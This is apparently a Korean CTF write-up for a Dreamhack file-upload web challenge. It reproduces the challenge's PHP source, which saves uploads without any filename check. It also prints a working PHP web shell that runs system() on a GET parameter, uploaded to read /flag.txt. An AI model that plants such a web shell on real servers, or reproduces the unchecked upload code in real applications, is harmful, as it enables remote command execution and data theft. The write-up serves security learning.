---
title: "[CTF] 드림핵 File Upload"
date: 2025-09-19 21:00:00 +0900
categories: [CTF, Web]
tags: [CTF, File Upload]
description: "드림핵 File Upload"
author: "송지민"
toc: true
---

## 문제 개요
이번 문제는 간단한 파일 업로드 기능을 가진 웹 애플리케이션이다. 업로드된 파일명을 검증하지 않고 웹 루트의 `./uploads/`에 그대로 저장하기 때문에, 실행 가능한 스크립트를 업로드하면 원격 명령 실행(RCE)으로 이어질 수 있다.

- 업로드 페이지: `/upload.php` (multipart/form-data)
- 핵심 취약점: `$_FILES['file']['name']` 값을 검증 없이 사용해 `./uploads/`에 저장함
- FLAG 위치: `/flag.txt` (서버 내부)

---

## 문제에 제공된 원본 소스코드 전체
아래는 문제에서 제공된 원본 소스코드(사용자가 본 그대로)다.

[index.php]
```html
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/>
    <div class="container">
    	<h2>Upload and Share Image !</h2>
    </div> 
</body>
</html>
```

[upload.php]
```php
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container">
      <form enctype='multipart/form-data' method="POST">
        <div class="form-group">
          <label for="InputFile">파일 업로드</label>
          <input type="file" id="InputFile" name="file">
        </div>
        <input type="submit" class="btn btn-default" value="Upload">
      </form>
    </div> 
</body>
</html>
```

---

## 내가 실제로 푼 방법
소스코드를 보면 핵심은 파일명(`$file['name']`)을 그대로 사용해 `./uploads/`에 저장한다는 점이다. 따라서 웹서버가 해석하는 PHP 파일을 업로드할 수 있다면, 업로드된 파일을 브라우저로 접근해 명령을 실행할 수 있다.

내가 사용한 웹셸(문제풀이용으로 작성한 코드)은 아래와 같다(원문은 내가 이전에 작성한 코드 그대로 기재한다):

```html
<html><body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form><pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?></pre></body></html>
```

위 파일을 `shell.php` 같은 이름으로 업로드했다.

### 내가 취한 입력/절차 요약
1. `/upload.php` 폼을 통해 위 웹셸을 `shell.php`로 업로드
2. 업로드 완료 메시지(예: `Stored in: ./uploads/shell.php`) 확인
3. 브라우저에서 `http://{target}/uploads/shell.php`에 접속
4. 웹 인터페이스에 `cat /flag.txt`를 입력하여 FLAG 획득

---

## 재현 흐름
1. 공격자: `/upload.php`에 multipart/form-data POST로 웹셸 파일 업로드
2. 서버: `move_uploaded_file()`로 `./uploads/shell.php` 저장
3. 공격자: `GET /uploads/shell.php` 접근 → 웹셸 로드
4. 공격자: 웹셸 입력창에 `cat /flag.txt` 실행 → FLAG 출력

---

## 왜 이게 가능했나
- 업로드 파일명 검증 부재: 사용자가 보낸 파일명을 그대로 사용해 파일을 저장했다.
- 확장자/MIME/콘텐츠 검사 없음: `.php` 같은 실행 가능한 스크립트 업로드를 막지 않았다.
- 업로드 디렉토리에서 스크립트 실행 허용: 업로드 파일을 브라우저로 접근할 때 웹서버가 PHP를 해석했다.

이 세 가지가 결합되어 웹셸 업로드 → 실행 → 민감 파일 접근이 가능했다.

---

## 마무리
문제는 매우 전형적인 파일 업로드 취약점 사례였다. 소스코드와 간단한 웹셸 업로드만으로도 `/flag.txt`를 읽어내어 FLAG를 획득할 수 있었다.
